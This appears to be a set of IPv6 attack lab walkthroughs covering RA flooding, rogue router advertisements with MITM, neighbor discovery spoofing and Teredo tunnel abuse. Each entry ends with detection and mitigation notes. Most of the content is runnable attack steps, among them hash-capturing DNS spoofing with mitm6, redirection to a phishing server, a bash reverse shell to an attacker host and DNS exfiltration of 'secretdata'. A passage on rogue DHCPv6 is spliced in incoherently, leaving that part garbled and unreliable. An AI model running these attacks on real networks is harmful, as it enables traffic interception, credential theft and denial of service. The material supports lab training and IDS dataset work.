- **Attack Steps**: ### 🟢 STEP 1: Setup the Lab🖥️ Attacker Machine: Kali Linux (or ParrotOS)🖥️ Victim Machine: Windows or Ubuntu➡️ Ensure both machines are in the same LAN or same NAT/bridged network in VMware/VirtualBox✅ In VMware: Go to VM > Settings > Network > Select “Bridged” or “NAT”🧪 Check connectivity:On Kali terminal:ping6 ff02::1✅ This pings all IPv6-enabled devices on LAN---### 🟢 STEP 2: Install THC-IPv6 Toolkit (Attacker Side)1. Open Terminal in Kali2. Install dependencies:sudo apt update && sudo apt install build-essential git libpcap-dev3. Clone the toolkit:git clone https://github.com/vanhauser-thc/thc-ipv6.git4. Install it:cd thc-ipv6 && make✅ It will compile and give many tools like flood_router26, alive6, dos-new-ip6, etc.---### 🟢 STEP 3: Monitor Victim System Before Attack💻 On the victim (Ubuntu):Run: ip -6 address✅ You’ll see default IPv6 addresses assignedOn Windows:1. Open Command Prompt2. Run: ipconfig /all✅ Note IPv6 addresses and gateway🧪 Open browser on victim → visit any site✅ Works fine now (pre-attack behavior)---### 🟢 STEP 4: Start Wireshark to Capture Data (Optional – Dataset Generation)1. On Kali:• Open Wireshark• Select interface: eth0 or enp0s3• Filter: icmpv62. Click “Start Capture”✅ This will capture RA flood traffic in real time---### 🟢 STEP 5: Launch the RA Flood Attack (Attacker Side)💥 This step starts the real attackIn Kali terminal:cd thc-ipv6sudo ./flood_router26 eth0✅ Replace eth0 with your interface name (check with ip a)🛑 This floods the network with spoofed ICMPv6 Router Advertisements• Each fake RA tells clients to use it as a router• Clients generate IPv6 addresses and routing tables based on theseWait for 30-60 seconds while flooding---### 🟢 STEP 6: Monitor Victim Behavior After Attack💻 On Victim (Ubuntu):ip -6 address✅ You’ll see many random IPv6 addresses auto-assignedip -6 route → shows many fake routes💻 On Windows:ipconfig /all shows dozens of IPv6 addresses and gateways🛜 Internet browsing stops working📶 Network slow/hangs🧪 Packets being misrouted✅ This confirms the attack was successful---### 🟢 STEP 7: Stop the AttackOn Kali terminal:Press CTRL+C to stop the flood_router26 tool---### 🟢 STEP 8: Cleanup and Restore Network (Victim Side)On Ubuntu:sudo systemctl restart NetworkManagerOr:sudo dhclient -r && sudo dhclientOn Windows:1. Disable and re-enable the network adapter2. Or reboot the system✅ This resets the IPv6 config---### 🟢 STEP 9: Export Dataset (Optional)On Kali Wireshark:• Stop capture• Save file: File > Save As > ra_flood_attack.pcapng• Label packets with: RA Flood, DoS IPv6, icmpv6_advert🧠 You can now use this .pcap in machine learning, intrusion detection, or lab reports---🧠 TIPS:• Use rate or --count with flood_router26 to throttle attack• Combine with ndpmon or radvdump to fingerprint routers• Use this simulation in switch hardening, port security test setups• Wireshark Graph: Statistics → IPv6 Conversations → View Spike
- **Detection**: - Wireshark with ICMPv6 filter- IDS with rules for excessive RA packets- Logs showing SLAAC overload
- **Solution**: - Enable RA Guard on switches- Disable IPv6 if unused- Use static addressing or DHCPv6 with filters- Block rogue RA using NDPMon or Snort signatures
- **Tags**: #IPv6Attack #RAFlood #ICMPv6 #DenialOfService #RouterAdvertisement #NetworkPentest #THCIPv6 #DatasetPCAP

## Rogue Router Advertisement + MITM

- **Attack Type**: IPv6 MITM via Fake RA + DNS Hijack
- **Target**: IPv6-enabled endpointsWindows and Linux LAN clients
- **Vulnerability**: SLAAC trustNo RA GuardDNS/DHCP spoofingNo router validation

- **Scenario**: This attack simulates how an attacker can send fake IPv6 Router Advertisements to nearby systems to make them assign attacker’s machine as the default gateway. After that, attacker can perform Man-in-the-Middle (MITM) attacks, such as sniffing traffic, redirecting DNS queries, or injecting malicious responses. It abuses the IPv6 SLAAC (Stateless Address Autoconfiguration) system which auto-configures default routes from received RA packets. Most modern devices auto-accept RAs by default. We'll use fake_router6 + mitm6 + ettercap/tcpdump/wireshark to simulate full attack. Great for real lab use and dataset generation.
- **Attack Steps**: ### 🟢 STEP 1: Setup Lab Network💻 Attacker: Kali Linux💻 Victim: Windows 10 or Ubuntu➡️ Both must be on same LAN or NAT/Bridged virtual network🧪 Confirm connectivity:On Kali:ping6 ff02::1 — ✅ to discover IPv6 devices---### 🟢 STEP 2: Check Victim Default Route Before AttackOn victim (Ubuntu):ip -6 route → Check default gatewayOn victim (Windows):1. Open CMD2. Run: route print or netsh interface ipv6 show route✅ Note current default gateway---### 🟢 STEP 3: Install & Setup THC-IPv6 and mitm6On Kali:1. Clone THC IPv6:git clone https://github.com/vanhauser-thc/thc-ipv6.git && cd thc-ipv6 && make2. Install mitm6:git clone https://github.com/fox-it/mitm6.git && cd mitm6 && sudo python3 setup.py install✅ Tools are now ready---### 🟢 STEP 4: Start Fake Router Advertisement (RA Injection)Open new terminal on Kali:cd thc-ipv6Run:sudo ./fake_router6 eth0✅ Replace eth0 with your interface (ip a to confirm)This sends malicious RA packets claiming that Kali is the default router---### 🟢 STEP 5: Observe Changes on VictimOn victim (after 5–15 seconds):• Ubuntu: ip -6 route → default route points to Kali• Windows: route print → new default gateway shows Kali IP✅ Now victim sends all IPv6 traffic to attacker---### 🟢 STEP 6: Launch DNS Spoofing or Packet Sniffing (MITM Stage)#### OPTION A – Passive Traffic SniffingOn Kali terminal:sudo wiresharkFilter: ip6 or icmpv6✅ You can view IPv6 browsing traffic, DNS queries, etc.#### OPTION B – DNS Spoofing (mitm6)Open new terminal:sudo mitm6 -i eth0✅ This hijacks IPv6 DNS requests and responds with attacker's IP→ Perfect for capturing NTLMv2 hashes from Windows#### OPTION C – Full MITM with ettercapsudo ettercap -T -i eth0 -M mitm -6✅ Sniffs traffic + injects (if needed)---### 🟢 STEP 7: DNS/Traffic Manipulation (Optional Lab Extension)Use iptables or redirect tools:Example:sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080✅ Redirect HTTP to local phishing serverOr run:sudo dnschef --interface eth0 --fakeip 192.168.56.110✅ Fakes DNS responses---### 🟢 STEP 8: Stop Attack and Cleanup• On Kali: CTRL+C in all terminals• On victim: - Ubuntu: sudo systemctl restart NetworkManager - Windows: ipconfig /release6 && ipconfig /renew6✅ Default route reset---### 🟢 STEP 9: Save Dataset (Optional – For Report or IDS Training)In Wireshark:• Save .pcapng file: rogue_ra_mitm.pcapng• Label: ra_flood, dns_spoof, ipv6_mitm, rogue_gateway---🧠 TIPS:• Works even if IPv4 is used! Because systems still accept IPv6 RAs• You can also test this on real LAN with switches• Great for showing weakness in SLAAC, and poorly secured VLANs• Pair with Responder to collect hashes
- **Detection**: - Monitor default gateway changes- Detect rogue RAs with RA Guard- Wireshark filters: icmpv6.type == 134- Check for duplicate router IPs
- **Solution**: - Enable RA Guard on switches- Block SLAAC if not needed- Use DHCPv6 with strict controls- Monitor for fake RAs or DNS hijacks

This results in Man-in-the-Middle (MITM) and traffic redirection. The attack abuses the lack of DHCPv6 server validation and the fact that Windows/macOS/Linux clients auto-accept DHCPv6 info. Open CMD2. Run ipconfig /all — check IPv6 DNS, Gateway✅ Note these values (you will compare them after the attack)---### 🟢 STEP 3: Install THC-IPv6 Toolkit (Attacker Setup)On Kali terminal:1. Stop capture2. Save as: rogue_dhcpv6_attack.pcapng3. ## Neighbor Discovery Spoofing (ND Spoof)

- **Attack Type**: IPv6 MITM + Denial via NA Spoofing (NDP Poisoning)
- **Target**: Any IPv6-enabled host (Windows, Linux, Mac) on LAN
- **Vulnerability**: NDP has no spoof protectionHosts accept forged NA messages
- **MITRE**: T1557 (Adversary-in-the-Middle)T1040 (Network Sniffing)T1498 (Protocol Abuse)
- **Impact**: - Traffic redirection to attacker- DoS or blackhole- Intercept DNS, credentials, browsing data
- **Tools**: ✅ Kali Linux (Attacker)✅ Windows 10 or Ubuntu (Victim)✅ THC-IPv6 toolkit✅ Wireshark or tcpdump✅ Optional: ettercap/bettercap (for sniffing)✅ VirtualBox/VMware with Bridged/NAT Network enabled
- **Scenario**: This simulation shows how attackers exploit IPv6 Neighbor Discovery Protocol (NDP) to poison the network by sending forged Neighbor Advertisements (NA). Like ARP spoofing in IPv4, this lets the attacker impersonate a victim or router, redirecting packets, or blackholing them to disrupt communication. Most modern OSes auto-accept NDP responses, so no user action is needed. The attacker uses fake_advertiser6 from THC-IPv6 toolkit. You’ll simulate MITM, DoS, or passive sniffing, and capture traffic in .pcap for dataset generation.
- **Attack Steps**: ### 🟢 STEP 1: Lab Setup and Interface Check💻 Attacker: Kali Linux💻 Victim: Windows or Ubuntu➡️ Ensure both systems are on the same NAT or Bridged networkOn Kali:ip a — Find your interface name (e.g., eth0, enp0s3)ping6 ff02::1 — Discover all IPv6-enabled neighbors (should get replies from victim)🧪 Optional: Start Wireshark on Kali and set filter: icmpv6---### 🟢 STEP 2: Install THC-IPv6 ToolkitOn Kali Terminal:sudo apt update && sudo apt install git build-essential libpcap-devgit clone https://github.com/vanhauser-thc/thc-ipv6.git && cd thc-ipv6 && make✅ Toolkit installed. You'll now use fake_advertiser6 for spoofing.---### 🟢 STEP 3: Discover Victim’s IPv6 and MACOn Kali Terminal:sudo ./alive6 eth0✅ This scans LAN and lists devices with IPv6 address and MACExample Output:fe80::a00:27ff:fe34:1234 → MAC: 08:00:27:11:22:33🧠 Save the IPv6 + MAC of victim and router/gateway---### 🟢 STEP 4: Send Fake Neighbor Advertisement (NA Spoofing)Goal: Tell the victim that attacker’s MAC is the router’s IPv6Syntax:sudo ./fake_advertiser6 <interface> <target IPv6> <spoofed IPv6>Example:sudo ./fake_advertiser6 eth0 fe80::a00:27ff:fe34:1234 fe80::1➡️ This says: "Hey victim, router IPv6 (fe80::1) is at MY MAC"✅ Now victim will send packets to attacker thinking it’s the router🧠 This is IPv6 version of ARP spoof---### 🟢 STEP 5: Confirm MITM or Traffic Flow🧪 Start sniffing DNS, HTTP, or IPv6 packets:sudo wireshark → Filter: icmpv6 or dnsOr use:sudo tcpdump -i eth0 ip6✅ You'll now see victim’s traffic coming through attacker---### 🟢 STEP 6: Optional – Use ettercap/bettercap for Full MITMInstall ettercap:sudo apt install ettercap-text-onlyRun:sudo ettercap -T -i eth0 -M ndp➡️ This performs automatic NDP poisoning + sniffing---### 🟢 STEP 7: Create Dataset from AttackOn Kali (Wireshark):1. Save capture: File > Save As > nd_spoof_ipv6.pcapng2. Label frames:• NA Spoof• ICMPv6 Poison• Traffic Redirection✅ Useful for ML training or IDS testing---### 🟢 STEP 8: Cleanup🛑 On Kali:CTRL+C in terminal running fake_advertiser6 or ettercap🛠 On victim:• Windows: ipconfig /flushdns & netsh int ipv6 reset• Linux: sudo systemctl restart NetworkManager✅ Restores proper NDP state---🧠 Tips:• You can use parasite6 to redirect multiple hosts• Wireshark filter: icmpv6.type == 136 to view NA spoof packets• Combine with DNS spoofing (via Responder) for full MITM+Phishing🛑 Always use in isolated lab or authorized scope only
- **Detection**: - Monitor icmpv6.type == 136 in Wireshark- Detect multiple NA replies per IP- Use NDP inspection on switches
- **Solution**: - Enable NDP Inspection or RA Guard- Use IPv6 static mappings if possible- Block unsolicited NA messages via firewall
- **Tags**: #NDSpoof #IPv6ARP #MITM #NeighborAdvertisement #NDPoison #RedTeam #ICMPv6 #PCAP

## IPv6-to-IPv4 Tunnel Abuse (6to4, Teredo)

- **Attack Type**: Tunnel Bypass / IPv6 over IPv4 Covert Channel
- **Target**: WorkstationsHome usersIoT devicesInternal corp endpoints with IPv6
- **Vulnerability**: Firewalls not inspecting tunneled IPv6 trafficLack of protocol 41 filteringDNS over IPv6 unmonitored
- **MITRE**: T1572 (Protocol Tunneling)T1048.002 (Exfiltration Over Alternative Protocol)T1095 (Non-Application Layer Protocol)T1020 (Automated Exfiltration)
- **Impact**: - Bypass firewall rules- Establish covert communication- Hide shell in IPv6 tunnel- Evade legacy detection systems
- **Tools**: ✅ Kali Linux (Attacker)✅ Windows 10/11 with Teredo enabled (Victim)✅ Wireshark✅ Scapy / netcat✅ IPv6 test servers (e.g., test-ipv6.com)✅ Optional: IPv6-Tunnelbroker like Hurricane Electric, firewall with IPv6 filtering✅ Admin rights on both machines
- **Scenario**: This simulation demonstrates how attackers can abuse IPv6 tunneling mechanisms like 6to4 and Teredo to bypass firewall rules, exfiltrate data, or establish command and control (C2) channels. IPv6-over-IPv4 tunnels often go undetected in traditional IPv4-only monitoring setups. If improperly configured, firewalls or IDS may ignore encapsulated traffic, making it a perfect target for attackers to bypass perimeter defenses, exfiltrate data, or inject payloads covertly. This simulation focuses on Teredo abuse and basic ICMP/UDP tunneling over IPv6 inside IPv4 using a real test lab with Wireshark, Kali, and Windows machines. Great for demonstrating firewall bypass, covert channel detection, and PCAP dataset creation.
- **Attack Steps**: ### 🟢 STEP 1: Set Up Lab MachinesAttacker: Kali Linux (with Scapy, Wireshark)Victim: Windows 10 or 11 (Teredo-enabled)➡️ Connect both to same NAT or test LAN### 🟢 STEP 2: Verify IPv6/Teredo Status on Victim (Windows)Open CMD:powershell<br>netsh interface teredo show state<br>✅ If Teredo is not enabled:netsh interface teredo set state enterpriseclientCheck IPv6 address:ipconfig /all → You should see Teredo address like 2001:0:....---### 🟢 STEP 3: Check 6to4 / Teredo FunctionalityOpen browser on victim:➡️ Visit http://test-ipv6.com✅ Confirm IPv6 is active---### 🟢 STEP 4: Set Up Wireshark on Kalisudo wireshark➡️ Start capture on eth0➡️ Filter: ipv6 or teredo or proto 41---### 🟢 STEP 5: Create IPv6 Tunnel-Based Ping (Simulate C2 Beacon)Attacker (Kali):sudo scapyInside scapy:python<br>send(IP(dst="victim_ipv4")/IPv6()/ICMPv6EchoRequest())<br>✅ This sends IPv6 encapsulated in IPv4 (proto-41)On victim:Monitor incoming traffic via Wireshark---### 🟢 STEP 6: Reverse Shell via Teredo Tunnel (Bypass NAT + Firewall)Attacker:Start listener:nc -nlvp 4444Victim:Run encoded shell through IPv6 using Teredo:powershell<br>bash -c 'bash -i >& /dev/tcp/attacker_ipv6/4444 0>&1'<br>⚠️ This works over Teredo even when direct IPv4 traffic is blocked---### 🟢 STEP 7: DNS Exfiltration via IPv6 Tunnel (Simulate Data Leak)Victim:nslookup secretdata.attackerIPv6.net✅ Attacker logs DNS via tunnel endpoint---### 🟢 STEP 8: Monitor and Label Traffic (Wireshark + Logging)Wireshark:• Save: File > Save As → ipv6_tunnel_bypass.pcap• Filter for: • Protocol 41 • UDP port 3544 (Teredo) • IPv6 → IPv4 mappings✅ Label DNS, ICMP, Shell traffic---### 🛑 STEP 9: Cleanup & HardenVictim:netsh interface teredo set state disabledFirewall:• Block Proto 41• Block UDP 3544Attacker:• Stop nc• Clear history🧠 Tips:• Use tunnel brokers to simulate more exotic IPv6 setups• Log and compare latency between IPv4 and tunneled traffic• Tag packets by size, tunnel type, and headers for ML use case
- **Detection**: - Monitor proto 41 / UDP 3544- Wireshark filters for IPv6 encapsulation- Use Suricata rules for Teredo, 6to4 signatures- DNS exfil pattern analysis
- **Solution**: - Disable Teredo/6to4 if unused- Block proto 41, UDP port 3544 at firewall- Enforce IPv6 inspection- Monitor DNS queries over IPv6
- **Tags**: #IPv6Tunnel #TeredoAbuse #FirewallBypass #TunnelExfiltration #CovertC2 #Protocol41 #DNSLeak #IPv6Security #BypassNAT
